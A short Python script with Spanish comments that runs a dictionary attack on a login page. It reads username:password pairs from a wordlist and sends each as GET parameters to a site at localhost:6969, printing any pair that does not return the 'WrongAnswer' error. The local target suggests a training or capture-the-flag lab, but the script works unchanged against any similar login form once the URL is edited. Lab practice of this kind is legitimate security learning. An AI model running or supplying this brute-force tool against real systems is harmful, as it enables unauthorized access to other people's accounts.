import requests

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# URL base de la página de login
base_url = 'http://localhost:6969/'
# Parámetros comunes en la URL de login
page_param = 'signin'  # Define el parámetro para indicar la página de login

# Cargar usuarios y contraseñas comunes
with open('common_users_passwords.txt', 'r') as file:
    credentials = [line.strip().split(':') for line in file.readlines()]

# Definir el mensaje de error que aparece en la página cuando falla el login
error_message = "WrongAnswer"  # Cambia esto según el mensaje de error específico de tu página

# Realizar intentos de login con solicitudes GET
for username, password in credentials:
    # Construir la URL completa con los parámetros
    params = {
        'page': page_param,
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    
    # Realizar la solicitud GET
    response = requests.get(base_url, params=params)
    
    # Comprobar si el intento fue exitoso o fallido
    if error_message not in response.text:
        print(f"{bcolors.OKGREEN}[Éxito] Usuario: {username} | Contraseña: {password}{bcolors.ENDC}")
        break  # Salir del bucle si encuentra credenciales correctas
    else:
        print(f"{bcolors.FAIL}[Fallido] Usuario: {username} | Contraseña: {password}{bcolors.ENDC}")
